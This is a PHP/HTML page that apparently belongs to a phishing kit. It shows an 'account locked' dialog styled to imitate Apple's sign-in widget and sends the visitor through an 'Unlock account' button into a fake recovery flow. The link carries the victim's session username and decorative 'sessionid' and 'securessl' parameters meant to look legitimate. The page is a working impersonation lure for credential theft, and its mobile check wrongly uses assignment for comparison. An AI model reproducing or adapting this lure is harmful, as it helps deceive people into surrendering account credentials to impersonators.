<?php
require '../../slekek/func.php';
require '../../slekek/session_me.php';
require '../../slekek/acc.php';

?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="dialog fade-in" style="background: rgba(255, 255, 255, 0.85); border-radius: 0px; border: none; max-width: 482px; max-height: 270px;">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<h2 style="font-weight: 600;line-height: 1.09375; font-size: 32px; margin: 5px 20px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949; font-heigth"><?php echo $_LANG['REASON'];?></h2>
</div>
</div>
<div body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<div class="thin" style="font-weight: 500; color: #494949; line-height: 2.0; letter-spacing: 0.021em;"><?php echo $_LANG['REASON2'];?></div>
<?php 
if ($_SESSION['mobile'] = 1) {
?>
<a class="Unclock" target="_top" href="../../myaccount/Step1.php?!#page=recovery&user=<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo md5(date('ls')); ?>&securessl=true" style="font-weight: 500; padding: 5px 16px; background-color: #0070c9; background: linear-gradient(#42a1ec, #0070c9); color: white; border-radius: 4px; font-size: 18px; text-decoration: none;"><?php echo $_LANG['UNLOCKACC'];?></a>

<?php
}elseif ($_SESSION['mobile'] = 0) {
?>
<a class="Unclock" target="_top" href="../../myaccount/?!#page=recovery&user=<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo md5(date('ls')); ?>&securessl=true" style="font-weight: 500; padding: 5px 16px; background-color: #0070c9; background: linear-gradient(#42a1ec, #0070c9); color: white; border-radius: 4px; font-size: 18px; text-decoration: none;"><?php echo $_LANG['UNLOCKACC'];?></a>
<?php 
} 
?>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>